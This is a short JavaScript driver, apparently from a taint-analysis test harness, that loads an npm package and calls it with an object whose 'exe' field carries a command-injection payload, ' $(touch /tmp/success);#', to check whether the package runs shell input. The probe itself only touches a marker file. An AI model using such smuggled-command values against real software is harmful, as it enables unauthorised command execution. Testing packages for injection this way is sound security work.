// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/did_it_work/node_modules/did_it_work');
try {
	var x0 = {"exe":{"exe":" $(touch /tmp/success);#"}};
var x1 = {};
new PUT(x0,x1)();
} catch (e) {
	console.log(e);
}